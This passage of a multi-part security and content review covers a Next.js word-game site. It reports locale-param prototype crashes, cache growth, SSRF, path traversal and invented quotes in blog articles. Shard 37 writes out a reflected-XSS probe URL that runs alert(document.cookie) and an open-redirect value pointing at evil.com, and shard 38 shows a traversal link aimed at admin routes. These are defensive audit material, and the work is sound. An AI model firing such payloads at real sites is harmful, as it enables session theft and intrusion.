Shard 34 said the "19,000-person study" is the ACTIVE trial, about 2,800 people. This batch shows the source the site actually uses: Brooker et al. 2019, the PROTECT cohort, which has about 19,000 participants (netflix `content.ts:75`, `:174`; `science-behind-word-games/page.tsx:69-71`). The right fix for the brain-training article is probably to re-attribute the figure to PROTECT, not to change the number.

Even then, PROTECT is cross-sectional. "Scored as if 8–10 years younger" (netflix `:75`) is a correlation and shouldn't be presented as an effect. The English text also says the 19,000 "regularly solved word puzzles"; 19,000 is the whole sample, not the puzzlers.

**What to fix first:** 1 is a one-line layout check, 3 is legal exposure, and 5 affects AdSense approval. The rest are content fixes.

## Shard 36

# Deep review: the three blog articles in this batch

## Scope

The files in this batch are three blog articles: `why-word-games-are-addictive`, `word-game-history` and `word-games-and-mental-health`. Each has a `page.tsx`, a `PageClient.tsx` and a `content.ts`.

They contain no auth, billing, socket, write-path or concurrency code. So I can't add authorization or race findings from what was shared.

The repo's most dangerous issues are already in the previous report. Fix those first:
- Shard 5 #1: the handshake `authUserId` spoof.
- Shard 5 #2: game-code overwrite.
- Shard 4 #8: the anonymous roster bypass.
- Shard 3 #1: double-paying ratify.

Below are six things the previous pass missed. Two are code issues and four are legal or business risks in the content.

---

## 1. The `[locale]` URL segment is used as a raw object key: prototype names crash pages, and the cache can grow without limit (Medium, depends on middleware)

**Where:**
- `why-word-games-are-addictive/page.tsx:37,40,45,50-53` and `PageClient.tsx:21,24,108`
- The same pattern in `word-game-history/page.tsx:45` and `PageClient.tsx:25,138`
- The same pattern in `word-games-and-mental-health/PageClient.tsx:25,135`

**Failure scenario:**
1. A request arrives for `GET /__proto__/blog/why-word-games-are-addictive`. The same applies to `/constructor/...` and `/toString/...`.
2. `contentByLocale['__proto__'] || contentByLocale.en` returns `Object.prototype`. That value is truthy, so the English fallback never runs.
3. `metaTitles['__proto__']` is also truthy, so the page title becomes `[object Object]`. The check `locale in metaTitles` is `true`, so the page is marked as a real translation.
4. During server rendering, `content.sections.map` (`PageClient.tsx:108`) throws a `TypeError` and the response is a 500. `/constructor/` behaves the same way, because it resolves to the `Object` function.
5. A random string such as `/xyz123/blog/...` does not crash. It renders English and returns 200. Because of `revalidate = 86400` and on-demand rendering of unknown params, each new string becomes its own cache entry on the Node server. A script can therefore fill the `.next` cache and disk at no cost.
6. `locale` is also inserted into the breadcrumb JSON-LD URL (`page.tsx:51-53`). Shard 26 noted that `JSON.stringify` does not escape `</script>`. If a decoded segment can contain `</script>`, this becomes reflected XSS on the main domain, where Supabase tokens are stored. I can't confirm this without seeing the serializer and the middleware.

**Why the previous pass missed it:** Shards 2, 26, 27, 36, 37 and 41 each flagged locale validation for one page, framed as wrong language or wrong canonical URL. None of them noticed the prototype-key crash or the cache growth. The underlying problem is architectural: no single boundary validates the locale. Each of roughly 100 pages re-derives it with `map[locale] || map.en`.

**Fix:**
1. In `app/[locale]/layout.tsx`, call `if (!LOCALES.includes(locale)) notFound()`. Also export `generateStaticParams` and set `dynamicParams = false` there.
2. Make the middleware reject unknown first segments.
3. Do lookups with `Object.hasOwn(map, locale) ? map[locale] : map.en`.
4. In the JSON-LD serializer, replace `<` with `\u003c`.

Run `curl -I https://www.lexiclash.live/__proto__/blog/why-word-games-are-addictive` to see whether production is exposed.

---

## 2. Every language's full article text is sent to every visitor's browser (Medium, performance at scale)

**Where:** `why-word-games-are-addictive/PageClient.tsx:1,14`, `word-game-history/PageClient.tsx:1,15`, `word-games-and-mental-health/PageClient.tsx:1,15`

**Failure scenario:**
1. `PageClient` is a `'use client'` component that imports `contentByLocale`.
2. That pulls the entire `content.ts` into the client JavaScript chunk. For the files shown, that is 590 to 750 lines of text in six languages.
3. A Hebrew reader downloads and parses the English, Swedish, Japanese, Spanish and Russian text as well, then hydrates it.
4. The server already picked the right locale at `page.tsx:45` but passes nothing down, so the client picks it again.
5. This repeats on every blog post. These are the ad-revenue pages, and you already monitor web vitals (shard 27). At 10× more articles or locales, the cost grows linearly per page.

**Fix:**
- In `page.tsx`, pass the chosen locale's content down as a prop: `<PageClient content={content} />`.
- Remove the `content.ts` import from `PageClient`. Better still, turn the article body into a server component and keep only the theme-dependent parts on the client.
- Do this once in a shared `BlogArticleShell`. About 30 copy-pasted shells cause this problem, and they also cause most of the date, heading and related-links drift that the previous report listed.

---

## 3. Invented quotes from a named, real researcher and invented clinician interviews on a mental-health article (High, legal and trust)

**Where:**
- `word-games-and-mental-health/content.ts:88`: "Rachel Kowert… She said: 'Any activity that fully occupies working memory…'"
- `:90-94`: "A clinical psychologist I spoke with (who asked to remain anonymous)…" and "Not every therapist was enthusiastic…"
- The same in Russian at `:668-674`, and similar clinician quotes in he `:220-224`, sv `:348-352`, ja `:455-459` and es `:562-566`.
- Uncited study claims at `:52`, `:58`, `:80`, and a sources list (`:139-146`) that has no authors for three of the studies.

**Failure scenario:**
1. A reader, journalist or Dr. Kowert herself searches for the quote. It appears only on lexiclash.live, under the byline "Ohad Fisher".
2. Attributing invented words to a living academic on a health topic is a false-attribution or defamation risk. It is not just an SEO problem.
3. Google treats mental-health pages as "Your Money or Your Life" content, which gets the strictest quality checks. Invented interviews are the kind of signal that can downgrade the whole domain, not only this page.
4. You sell to schools. A district reviewer who finds this has a reason to drop you.

**Why the previous pass missed it:** Shard 34 explicitly skipped this article's figures as merely unverified. It didn't notice the direct quote attributed to a real person.

**Fix:**
- Delete the Kowert quote and the anonymous-clinician quotes in all six locales, unless you actually conducted those interviews and have permission.
- Cut the uncited studies, or give full citations.
- Add a one-line "not medical advice; if you're struggling, contact…" note.

---

## 4. Your own blog describes your game's end screen as a deliberate compulsion hook, on a product sold for children (Medium-High, regulatory and sales)

**Where:**
- `why-word-games-are-addictive/content.ts:80`: "The end-of-round screen showing missed words isn't informational. It's a psychological hook."
- `:36`: "most elegantly engineered psychological loops"
- `:106`: "the same mechanisms that make gambling addictive"
- `word-game-history/content.ts:82`: "This is the DNA that LexiClash inherits"
- `why-word-games-are-addictive/content.ts:110`: "There's no financial mechanism." The same claim appears in he `:252`, sv `:402`, ja `:553` and ru `:704`.

**Failure scenario:**
1. LexiClash shows a missed-words results screen. It also has coins and in-game cash, hints you pay for (shard 4 #6), chest drops (shard 5 #4), an ad-removal purchase, and paid Teacher Pro.
2. A Google Play Families reviewer, a parent, or a school data-privacy officer reads an article on your own domain. It says your game uses deliberate reward loops modelled on slot machines, and it claims there is no financial mechanism.
3. That gives a ready-made exhibit to anyone applying the UK Age Appropriate Design Code rule against nudge techniques, FTC dark-pattern guidance, or Play's Families policy. Shard 26 shows you already have a Families-policy screen.
4. It also contradicts the "safe for classrooms" message on the education pages, which are your revenue funnel.

**Fix:**
- Rewrite the article in the third person about word games in general, and remove the "game designers know this… it's a hook" framing.
- Delete "no financial mechanism".
- Alternatively, noindex the article and keep it off the education-linked pages. It is cheap insurance before you apply to Play or sell to districts.

---

## 5. The published editorial policy is contradicted by this content (Medium, AdSense and Play review)

Shard 37 notes that `editorial-policy/page.tsx:125-130` says no article is generated by AI. Reviewers will compare that claim with pages like these:

**The narrator's gender changes under one byline:**
- `mental-health/content.ts:26-27` sets the author as "Ohad Fisher" with a bio that says "she still goes to therapy".
- The Hebrew author is "חנון המילים" with a male bio (`:158-159`), but the Hebrew body text is female (`:170`).
- The Russian has a male psychologist (`:610`) and then "Она была права" ("she was right") on the next line (`:612`).
- `word-game-history` ru `:502` has "партнёр… он прав" (a male partner) while en `:32` says "She".

**The Hebrew in `word-game-history` is unreadable in places:**
- `:131` "לא חדלו למטרוד בנו"
- `:147`, the whole paragraph
- `:157` "ממציא = תמלוגים, בן זוג = עושק"
- `:163` "השם של עַל"
- `:199` "קורוקמה"

Hebrew is your core market.

**Failure scenario:**
1. An AdSense or Play reviewer reads the editorial policy page.
2. They then open any Hebrew article and find text that looks machine-generated and a narrator who changes gender.
3. The policy now reads as a false statement, and that weighs more heavily than the low-quality content alone.

**Fix:**
- Either soften the policy to something like "AI-assisted, human-edited", or have a native speaker rewrite the Hebrew.
- Pick one narrator persona per byline.
- Until then, noindex the `he` versions of these articles.

---

## 6. False statements about real companies and people (Low-Medium)

**Litigation claim:** `word-game-history/content.ts` sv `:281` and ja `:371` say Hasbro sued Words With Friends and the parties settled. The well-known Hasbro and Mattel Scrabble lawsuit was against Scrabulous, in 2008. I don't know of any such suit against the Bettners or Zynga, so please verify. Saying a named company was sued and settled when it wasn't is a false statement of fact about a third party. The "20 million daily users" figure at `:283` and `:373` is also unsourced.

**Adam Alter:** He is called a "clinical psychologist" in `why-word-games-are-addictive` sv `:400`, ja `:551` and ru `:702`. He is a marketing professor at NYU Stern.

**Sapolsky:** The finding that dopamine rises more under uncertain rewards is credited to Sapolsky's own work (en `:52`, and the same in every locale). The study usually cited is Fiorillo, Tobler and Schultz (2003). Sapolsky popularised it in lectures.

**Fix:** Delete the lawsuit sentence, change "clinical psychologist" to "NYU professor", and credit the dopamine study correctly.

---

## Already reported, not repeated

These are already in the previous report: UTC date rendering and hydration warnings, using `language` instead of `locale` for dates, the missing `ru` related-articles heading, the "Gansen" mistranslation, and the hard-coded related-articles maps.

## Shard 37

# Security and architecture review: the brag, brain and landing slice

The previous pass covered the copy, SEO and date problems in these files. This pass does not repeat them: the brain-training health claims, the missing `es` body, brag metadata text injection, the "5 drills" copy, and the `ru` typos are already reported. Everything below is new or adds new evidence.

The files here hold no billing or auth logic. The real risks are trust boundaries: route params and room codes that the code treats as trusted, and rendering cost that will not hold up at 10x traffic. Several findings depend on code I couldn't see, and I say which.

---

## 1. The `locale` route param is written raw into `<script>` tags and hrefs, and this page shows unsupported locales reach rendering
**Severity:** High if the curl test below reflects. Low if middleware already rejects unknown locales.

**Where:**
- `fe-next/app/[locale]/brain-training-word-games/page.tsx:34`, `:94`, `:103`, `:118`, emitted at `:139-142`
- `fe-next/app/[locale]/brag/[code]/PageClient.tsx:26`, `:62`

**Why this is new:** Earlier shards said "confirm locale is whitelisted." This file answers part of that. Line 34 computes `isSupported` and sets `robots.index` from it. That line only matters if unsupported locales render this page. So at least for this route, middleware does not reject them.

**Failure scenario:**
1. An attacker sends `/%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E/brain-training-word-games`.
2. Next decodes the segment into `params.locale`.
3. `JSON.stringify` at `:94`, `:103` and `:118` puts the locale inside a string, but it does not escape `<` or `/`.
4. `dangerouslySetInnerHTML` at `:139-142` emits the result. The `</script>` in the locale closes the JSON-LD tag, and the attacker's script runs on `www.lexiclash.live`. That gives reflected XSS against signed-in teachers and admins, and the Supabase session in localStorage is readable.
5. A related problem: `PageClient.tsx:26` builds `` `/${locale}?room=…` ``. If a locale decodes with a leading `/`, for example from `%2Fevil.com`, the href becomes `//evil.com?room=…`. That is an open redirect from a "Take the rematch" button. Whether `%2F` survives decoding depends on your Next version.

**Fix:**
- In `app/[locale]/layout.tsx`, call `notFound()` unless `LOCALES.includes(locale)`. One check there protects every page.
- Add a `safeJsonLd(obj)` helper that runs `JSON.stringify(obj).replace(/</g, '\\u003c')`. Use it for every `dangerouslySetInnerHTML` JSON-LD block.
- To confirm: run `curl` against the path above and check whether the payload is reflected.

---

## 2. Brag links make a room code a permanent, forwardable bearer invite
**Severity:** Medium. Child-safety and trust risk if codes are recycled or classroom rooms can produce brag links.

**Where:** `fe-next/app/[locale]/brag/[code]/PageClient.tsx:26`, `page.tsx:55`

**Failure scenario:**
1. A player shares a brag link to a group chat or social post. The URL contains the live room code.
2. The link is forwarded and screenshotted, and it lives indefinitely.
3. Short room codes are normally recycled once a room ends. Weeks later, a stranger taps "Take the rematch" and lands in whichever room now holds that code. That room could be someone else's private game, or a classroom of minors if classroom and multiplayer share the code space.
4. Even without recycling, the original host never consented to unlimited joins from a public post.

**Fix:**
- Give each brag its own opaque id, for example `brag/<random>`, stored server-side with `{roomCode, hostId, expiresAt}`.
- On "rematch", join only if that room still exists, belongs to the same host and is public. Otherwise, start a fresh room seeded from the result.
- Never put classroom game codes on this path.

**Verify:** code length, the recycling policy, and whether brag can fire from classroom games.

---

## 3. Brag OG images have unbounded render cost
**Severity:** Medium. This is the design most likely to break at 10x traffic.

**Where:** `fe-next/app/[locale]/brag/[code]/page.tsx:35-40` and `:72`, which drive `/api/og/brag`

**Failure scenario:**
1. Every brag URL has a unique query (`score`, `rival`, `name`, `words`, `best`), and the page is `force-dynamic`.
2. Each unfurl triggers a fresh Satori/`ImageResponse` render. WhatsApp, iMessage, Slack, Discord and Telegram each fetch separately, often once per recipient or channel. One viral share causes tens of renders.
3. An attacker who loops over `score=1..1e6` gets a cache miss every time. The route only clamps values; it does not canonicalize them, so near-identical inputs still produce distinct cache keys.
4. If OG rendering runs on the same Node process as the socket server, which earlier shards suggest for the anagram route, live games stall during a spike.

**Fix:**
- Canonicalize parameters before building the image URL: clamp, round and drop unknown keys, so equal results share one URL.
- Return `Cache-Control: public, s-maxage=31536000, immutable` from `/api/og/brag` so the CDN absorbs repeat fetches.
- Rate-limit the route per IP.
- Run OG rendering on edge or serverless, not the game server.

---

## 4. A static SEO landing page server-renders on every request
**Severity:** Low–medium. This is cost and TTFB on the top of the funnel.

**Where:**
- `fe-next/app/[locale]/boggle-word-shake-free/page.tsx:6`
- `brain/drills/*/page.tsx:5` (four files)

**Failure scenario:**
1. `boggle-word-shake-free/page.tsx` reads only `params`. Every string on it is static, yet `dynamic = 'force-dynamic'` disables static generation and ISR.
2. Every crawler hit and every ad- or search-driven visit does a full server render. A traffic spike, such as a Reddit post or an ad campaign, scales server load linearly instead of being served from the CDN.
3. The slower TTFB also hurts the LCP of the page you are trying to rank.
4. The drill pages are `force-dynamic` only to read `?check=1`, which the client could read itself.

**Fix:**
- Remove `force-dynamic` from the landing page. Add `generateStaticParams` returning `[{locale:'en'}]` and `revalidate = 86400`.
- For the drill pages, read `check` with `useSearchParams` in the client and make the server page static.

---

## 5. Brain Check mode is chosen by a client query string, so the "reliable-change verdict" can be gamed
**Severity:** Medium for data integrity. Unverified, because it depends on the drill submit API.

**Where:**
- `fe-next/app/[locale]/brain/drills/*/page.tsx:12-14`, which feeds `isCheck` into `DrillPageShell`
- `brain/PageClient.tsx:71-75` defines Check as a "fixed protocol, spaced" measurement

**Failure scenario:**
1. A user runs a Check and gets a "declined" verdict.
2. They open `/brain/drills/memory-hunt?check=1` again, and repeat until a good run lands. Or they ignore the spacing entirely.
3. If the server records a run as a Check based on a client-sent flag, three things break:
   - Spacing is not enforced.
   - Practice runs can be labelled as Checks.
   - Users can cherry-pick results.
4. The longitudinal measurement the hub promises is then meaningless. If it is ever shown to teachers or parents, it is misleading.

**Fix:**
- Add a `POST /api/brain/check/start` endpoint. It enforces the spacing window and one open check per user, then returns a check session id.
- Results count as a Check only when submitted against that id. The query param should choose the UI and nothing else.

---

## 6. Parallel-array coupling can 500 a locale or mislink drills
**Severity:** Low–medium.

**Where:** `fe-next/app/[locale]/brain-training-word-games/page.tsx:29`, `:69-74`, `:112-120`, `:176-188`

**Failure scenario:**
1. `copy.drills[i]` is zipped by index with `DRILL_IDS[i]`, `DRILL_VISUALS[i]` and `copy.itemListDescriptions[i]`.
2. The Pattern Switcher retirement was applied unevenly; the previous pass found other copy still says "5 drills". If any locale's `drills` array still has five entries, `v` is `undefined` at `:177`. `v.accentBg` then throws, and that locale's page returns 500.
3. Even without a crash, the ItemList JSON-LD emits `/brain/drills/undefined`.
4. If a translator reorders the drills in one locale, drill names link to the wrong drill URLs, silently, in both the page and the structured data.

**Fix:** Key the drill content by id, for example `drills: Record<DrillId, {...}>`. Iterate over `DRILL_IDS` and look up the copy and visuals by id. Fail the build if a locale is missing an id.

---

## 7. The landing page auto-starts a real game for every visitor and crawler
**Severity:** Low–medium. This is analytics integrity, and it is unverified.

**Where:** `fe-next/app/[locale]/boggle-word-shake-free/page.tsx:145-147`, `PageClient.tsx:7-17`. The shell copy at `StaticGameShell.tsx:202` says "The live game starts automatically."

**Failure scenario:**
1. Googlebot and other JS-rendering crawlers execute `SinglePlayerView`, and so does every visitor who bounces within seconds.
2. If game start or end fires analytics events, guest-stat writes, or `games_completed` counters, crawler and bounce traffic inflates "games started". That is the metric you would use to judge whether SEO converts.
3. It also counts toward the PWA and signup prompt gates that are keyed on games played, as noted in earlier shards.
4. Visitors also download the full game bundle on a page whose job is to rank.

**Fix:**
- Keep `StaticGameShell` as the server render. Mount `SinglePlayerView` only on a "Tap to play" click, or when the section is visible and a user gesture occurs.
- Suppress analytics for bot user agents.

---

## Checked, nothing new
- **`brain/PageClient.tsx`:** the hook order is correct, and the dirty-flag refresh is guarded.
- **Blog `page.tsx` files:** the locale used in breadcrumb URLs needs the same validation as finding 1, but the fix is the same `layout.tsx` guard.

**Fix first:** 1, then 2. Both are cheap. One centralized locale guard closes the injection class across every page.

## Shard 38

# Deep review: 8 issues the previous pass missed

This covers the files in this slice: `brain`, `challenge`, `community/*`, `competitive-word-games`, `connections/*`, `contact/*`, `create/board`, `crossword`, `curator`, `custom/*` and `daily-word-wheel`.

I left out anything the earlier shards already reported:
- challenge OG tags (shard 35)
- "5 drills" copy on `/brain` (shard 35)
- contact-page claims (shard 36)
- crossword `today` frozen at mount (shard 36)
- the TRAFFIC/JAM FAQ example (shard 36)

I couldn't see `next.config`, `proxy.ts`, `/api/contact`, `/api/ugc/*` or `useCuratorStatus`. Findings that depend on them are marked **unverified**.

---

## 1. Community board cover image: an attacker-supplied URL goes into `next/image`
**`fe-next/app/[locale]/community/[boardCode]/PageClient.tsx:95-103`**. **Severity: High if `remotePatterns` is wildcarded, Medium otherwise (unverified).**

**Failure scenario:**
1. A user creates a board whose `cover_image_url` is any URL they choose.
2. Anyone opening `/en/community/<code>` renders `<Image src={board.cover_image_url}>`. That goes through `/_next/image?url=…`, and your server fetches the URL.
3. **If `remotePatterns` allows `**`** (common, so UGC images "just work"):
   - Your Node process becomes an open image proxy and SSRF client. An attacker can point it at internal or metadata addresses, or at large files.
   - Every distinct URL is fetched, resized and cached on your box.
4. **If `remotePatterns` is strict:**
   - Any cover on a host that isn't allowlisted throws "hostname is not configured" while rendering.
   - The board page crashes for every visitor, so one creator can break their own share links.

**Fix:**
- Accept covers only as uploads to your own storage bucket.
- Validate the host server-side in the board create and update API.
- Render with `unoptimized` or a plain `<img>` behind that allowlist.
- Never put a wildcard in `remotePatterns`.

## 2. Crossword daily cache grows `localStorage` without limit and can starve the rest of the app
**`fe-next/app/[locale]/crossword/CrosswordPageClient.tsx:36-66, 128`**. **Severity: Medium (gets worse over time).**

**Failure scenario:**
1. Every day, `writeDailyCache` stores the whole puzzle JSON (grid plus clues) under a new key, `daily:{locale}:{format}:{date}`.
2. Nothing ever deletes old keys. Switching format or locale adds more.
3. A loyal daily player builds up hundreds of entries. A full board with clues is plausibly 5–20 KB, so this reaches the roughly 5 MB per-origin quota within months.
4. After that, every `setItem` on the origin throws. The crossword itself swallows the error (`:63`), but the other writers fail:
   - `persistSolve` (the streak this page shows)
   - guest stats and progress
   - training progress
   - curator rank state
5. Your most engaged users lose streaks and guest progress silently, and there is no error to debug.

**Fix:**
- On write, delete every `lexiclash:crossword:daily:*` key that isn't today's.
- Alternatively, drop the cache, since `generateDailyPuzzle` is deterministic.
- Add a version suffix to the key while you're there.

## 3. ISR cache can be filled with arbitrary locale segments
**`fe-next/app/[locale]/brain/page.tsx:8,22-24`** and **`connections/page.tsx:10,23-25`**. **Severity: Medium (10x and abuse). Unverified whether `proxy.ts` rejects unknown locales; other shards suggest it doesn't.**

**Failure scenario:**
1. Both pages use `generateStaticParams` plus `revalidate`, but neither sets `dynamicParams = false`. Neither calls `notFound()` for an unknown locale.
2. `/aaaa1/brain`, `/aaaa2/brain` and so on each render on demand and are stored as new ISR entries.
   - On a self-hosted Node server these entries go to disk and the in-memory cache.
   - Shard 27 says the same process serves the game.
3. A crawler or a simple loop can grow the cache without bound and evict the real pages.
4. `/brain` also emits JSON-LD and a canonical URL containing the junk locale.

**Fix:** add `export const dynamicParams = false;` to every route that uses `generateStaticParams`. Better still, reject unknown locales once, in `proxy.ts`.

## 4. Word Bridge daily can switch game type mid-run at UTC midnight
**`fe-next/app/[locale]/connections/daily/DailyPageClient.tsx:35-57`**. **Severity: Medium (UTC midnight is 7–8 pm US Eastern, which is prime time).**

**Failure scenario:**
1. `variant = dailyConnectionsVariant(todayUTC())` is recalculated on every render. The variant alternates by day.
2. A player starts the 5-riddle chain at 23:58 UTC.
3. At 00:01 they finish. `onTerminal` then calls `setFinished(true)`, which re-renders the component.
4. The variant is now `'pyramid'`, so `ConnectionsDailyChallenge` unmounts and `PyramidChallenge` mounts.
5. The results screen disappears. Any score submit or share that runs after `onTerminal` is cut off by the unmount.
6. A language-context re-render near midnight does the same thing mid-game.
7. SSR and client can also disagree near midnight, which causes a hydration mismatch.

**Fix:**
- Freeze the day at mount: `const [day] = useState(todayUTC); const variant = dailyConnectionsVariant(day);`.
- Pass `day` down so the child submits against the same date.

## 5. Contact form is an anonymous endpoint that sends email
**`fe-next/app/[locale]/contact/PageClient.tsx:39-62`**, which calls `/api/contact`. **Severity: Medium (unverified, because the route isn't in this slice).**

**Failure scenario:**
1. The client sends a free-form `name`, `email` and `message` with no honeypot, captcha or token.
2. A bot posts thousands of messages and floods the founder's inbox.
3. If the route sends anything to the user-supplied `email`, such as a confirmation or copy, it becomes a relay. Your domain would then send attacker text to arbitrary addresses.
4. Bounces and spam complaints damage the reputation of the sender domain. The same provider likely sends the trial-reminder and day-10 conversion emails, which are your revenue emails.
5. Separately, a non-JSON 5xx makes `response.json()` throw at `:52`. The user then sees "Unexpected token <".

**Fix:**
- Add Turnstile or a honeypot, plus IP rate limiting with `checkApiRateLimit`.
- Send only to your own inbox, with the user's address in `Reply-To`.
- Consider a separate sending subdomain for transactional mail.
- On the client, guard `res.json()` with a try/catch.

## 6. Static marketing and shell pages are `force-dynamic`, so they compete with live classes
**`competitive-word-games/page.tsx:5`, `community/page.tsx:6`, `community/[boardCode]/page.tsx:6`, `community/create/page.tsx:6`, `connections/{daily,play,pyramid,community}/page.tsx:4`, `challenge/[code]/page.tsx:38`, `custom/page.tsx:12`**. **Severity: Medium at 10x.**

**Failure scenario:**
1. These pages do no request-time work. `/competitive-word-games` is entirely string literals. Even so, every hit renders on the server.
2. The `/brain` and `/connections` comments show you already found this problem and fixed it there, but not on these routes.
3. SSR, the socket.io classroom handlers and the game run in the same Node process (`fe-next/backend/handlers`).
4. A crawl burst, or a share going viral on `/challenge/*`, therefore adds CPU load in direct proportion to traffic. That raises event-loop latency for live classroom games, which is the product teachers pay for.

**Fix:** use the same pattern as `/brain`: `revalidate` plus `generateStaticParams` plus `dynamicParams = false`. Keep `force-dynamic` only where cookies or `searchParams` are really read.

## 7. Board code goes unencoded into the fetch path and query string
**`community/[boardCode]/PageClient.tsx:27, 64`**. **Severity: Low–Medium.**

**Failure scenario:**
1. `boardCode` comes from the route param. App Router decodes it, so verify on your Next version.
2. A link like `/en/community/..%2F..%2Fadmin%2F<route>` becomes `fetch('/api/ugc/boards/../../admin/<route>')`. The browser normalises that to `/api/admin/<route>`, and it is sent with the victim's cookies.
3. This is client-side path traversal. An attacker can make an admin's browser issue any same-origin GET.
4. Play does `router.push(…?boardCode=${boardCode})` without encoding. A code containing `&…` injects extra query params into `/singleplayer`.
5. A related problem: a network error in `load()` has no `catch`, so the rejection is unhandled. A board with a null `grid` crashes the page at `:108`.

**Fix:**
- Validate `boardCode` against your code format (for example `/^[A-Za-z0-9_-]{4,32}$/`) in `page.tsx` and call `notFound()` otherwise.
- Use `encodeURIComponent` in both places.

## 8. Curator page for admins: no active language, max tier
**`fe-next/app/[locale]/curator/PageClient.tsx:26-30, 90`**. **Severity: Low–Medium (unverified, because it depends on `useCuratorStatus`).**

**Failure scenario:**
1. The comment says admins "hold no assignment rows". If `languages` is built from assignments, then for an admin `languages[0]` is `undefined`.
2. `activeLang` is therefore `undefined`, the tier is `MAX_CURATOR_TIER`, and `<CuratorInvalidWords language={undefined} tier={MAX}>` renders.
3. The subtitle reads "undefined". The list query then gets either `language=undefined`, which shows nothing, or no filter, which shows all languages.
4. In the second case, an admin ratifies or rejects words with full-tier actions on a list that silently mixes languages.

**Also:** the tier is calculated in the browser. Confirm the curator API routes recalculate it from `curator_assignments` and don't trust a tier or language sent by the client.

**Fix:**
- Give admins an explicit language picker that defaults to the URL locale.
- Don't render the list until `activeLang` is set.
- Enforce tier on the server for every review action.

---

**Where to start:**
- **#1:** check `remotePatterns` today.
- **#2:** it is silent data loss for your best users.
- **#4:** it is a one-line fix on a prime-time path.

## Shard 39

# Review: findings the previous pass missed in this slice

Most of this slice is SEO and landing pages. I found nothing in it that touches billing or writes data. The issues below are new: either the previous pass didn't raise them, or it raised a per-page symptom without the root cause.

I didn't re-report these, because they're already covered:
- Daily share-card text forgery (shard 36 #1).
- Locale-fallback 500s and the canonical-URL problems (shards 36 and 37).
- JSON-LD timezone mixing.
- Missing `ru` OG locale.
- The editorial "no AI" claim.

I couldn't see `useTeacherAccess`, `TeacherGate`, the `/api/og/*` routes, the middleware, or `[locale]/layout.tsx`. Each finding says what it depends on.

---

## 1. A just-approved teacher can loop between "You're approved" and the access gate
**`fe-next/app/[locale]/education/access/PageClient.tsx:42-44, 67-68, 147-175`** · **Medium-High** (activation funnel)

The comment at `:37` says the page uses "the same predicate TeacherGate admits on, so the two can never bounce each other." Only the auto-continue (`:43`) uses `hasAccess`. The approved card (`:68`) also shows when `status === 'approved'` and `hasAccess` is false.

**Failure scenario:**
1. A teacher applies and leaves the tab open. Their `profile.role` is cached in AuthContext as `student`.
2. You approve them. The approval writes `access_requests.status='approved'` and promotes the role. Those are two writes. Shard 22 notes the "approved-but-not-promoted" state exists.
3. `useTeacherAccess` re-reads the request and gets `status='approved'`. `hasAccess` still comes from the stale cached profile, so it is false.
4. `approved` is true, so the page shows "Go to Teacher HQ" (`:159`).
5. The teacher clicks it. `TeacherGate` checks `hasAccess`, which is false, and redirects to `/education/access?from=/teacher`.
6. `returnTo` is set, but `hasAccess` is still false, so there is no auto-continue. The approved card renders again, and the loop repeats until a hard reload or profile refresh. If the promotion write actually failed, the loop is permanent.

**Fix:**
- Set `approved = !isLoading && hasAccess`.
- For `status==='approved' && !hasAccess`, show a "Finishing setup…" state. That state should call `refreshProfile()` once and, if needed, a server endpoint that idempotently applies the role promotion, the same bridge pattern as `applyPendingProGrants`.
- Fire an alert event when this state is hit, so you find out about failed promotions.

## 2. Untrusted `[locale]` is used as an object key and inside `<script>` JSON-LD: prototype-key crashes and possible script breakout
**Severity:** Medium, conditional. It is zero if middleware already rejects unknown locales.

**Where:**
- `daily/layout.tsx:88, 93, 234, 250`
- `daily/word-wheel/page.tsx:180-182, 215`
- `download-word-game-android/content.ts:571`, `page.tsx:39, 92-93`
- `daily/archive/page.tsx:48, 85-95`
- `daily/archive/[date]/page.tsx:166-169`

The previous pass flagged "unvalidated locale → 500/canonical" page by page. It missed two concrete mechanisms.

**a) Prototype keys crash pages.** Each of these lookups uses a plain object and `||` / `??`:
- `seoContent[locale] || seoContent.en`
- `howToStepsByLocale[locale] || …`
- `COPY[locale] ?? en`
- `wordWheelSeoContent[validLocale] || …`

For `locale = "constructor"` (or `toString`, `valueOf`), the lookup returns `Object`, a truthy function, so the fallback never runs. The result:
1. `GET /constructor/daily` reaches `howToSteps.map(...)` at `daily/layout.tsx:243` and throws a TypeError, giving a 500.
2. `/constructor/download-word-game-android` calls `copy.faqs.map` (`page.tsx:105`) and gives a 500.
3. `/constructor/daily/word-wheel` calls `content.faq.length` (`:215`) and gives a 500. That route is ISR (`revalidate = 3600`), so a crawler or bot can also fill the ISR cache with one entry per junk locale string.

**b) Script breakout.** `JSON.stringify` does not escape `<`. Raw `locale` goes into `dangerouslySetInnerHTML` JSON-LD in every file listed. If Next hands you a decoded segment like `</script><script>…`, that is reflected XSS on `www.lexiclash.live`.

**Fix:**
1. Validate once in middleware or `[locale]/layout.tsx`: call `notFound()` unless the locale is in `LOCALES`. Add `generateStaticParams` and `dynamicParams = false` at the `[locale]` level.
2. Add one `jsonLd(obj)` helper that returns `JSON.stringify(obj).replace(/</g, '\\u003c')`, and use it everywhere `dangerouslySetInnerHTML` serializes JSON-LD.
3. Use `Object.hasOwn(map, key) ? map[key] : map.en`, or a `Map`, for locale lookups.

## 3. Daily share params drive an uncached OG-image render per unique URL, and `whAvatar` is forwarded unchecked
**`fe-next/app/[locale]/daily/page.tsx:96, 106-114, 119-130, 195`** · **Medium** (compute DoS; SSRF depends on the OG route)

The previous pass covered forged card text. It missed what those parameters do to the server.

**Failure scenario:**
1. `emojiGrid`, `displayName` and `avatarImage` have no length cap. They are copied into `/api/og/word-hunt?…`. `share` is appended raw to `/api/og/daily-rank?` at `:195`.
2. Every distinct query string is a cache miss for the OG route. Image generation (satori/resvg) is the most CPU-expensive request type you have.
3. A script that loops `?whPuzzle=1&whName=<random>`, or any chat unfurler hitting many variants, pins the Node process. That process also serves the live game sockets.
4. `whAvatar` → `avatarImage` is described as a "filename" (`:21`) but never validated. If the OG route fetches it with `fetch(\`${base}/avatars/${avatarImage}\`)` or similar, then `../` or a full URL turns it into path traversal on your own origin or SSRF.

**Fix:**
- Whitelist and clamp in this page:
  - `attempts` 0–10.
  - `streak` 0–9999.
  - `puzzleNumber` as an integer.
  - `displayName` ≤24 characters.
  - `emojiGrid` ≤10 lines, emoji only.
  - `avatarImage` matching `/^[a-z0-9_-]+\.(webp|png)$/` against the known avatar set.
- Rebuild the `daily-rank` URL from whitelisted keys instead of forwarding `share`.
- Apply the same validation inside both OG routes. They are directly reachable without going through this page.
- Set `Cache-Control: public, s-maxage=86400` on OG responses.

## 4. Static and immutable pages are `force-dynamic`, and the archive's `revalidate` is probably ignored
